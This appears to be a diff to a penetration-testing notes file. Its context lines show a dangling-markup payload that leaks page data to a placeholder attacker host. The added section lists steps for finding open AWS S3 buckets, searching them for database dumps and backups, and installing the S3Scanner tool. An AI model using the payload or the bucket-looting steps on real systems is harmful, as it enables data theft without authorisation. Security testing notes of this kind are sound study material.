@@ -399,7 +399,21 @@ Common CSP Controls:
         [PAYLOAD] = "><img src='//attacker-website.com?
         Resulting HTML: <input type="text" name="input" value=""><img src='//attacker-website.com?[SENSITIVE DATA]"/>
 
+## AWS S3 Buckets
 
-- 
-
-
+1. Find Open S3 Bucket
+2. Search for:
+    - sql
+    - sql.gz
+    - backup.zip
+    - backup.gz
+    - backup.tar
+    - backup.tar.gz
+    - Any other file that may be valuable
+S3Scanner:
+    - Source: https://github.com/sa7mon/S3Scanner
+    - Install:
+        git clone git@github.com:sa7mon/S3Scanner.git
+        cd S3Scanner
+        pip3 install -r requirements.txt
+        python3 -m S3Scanner
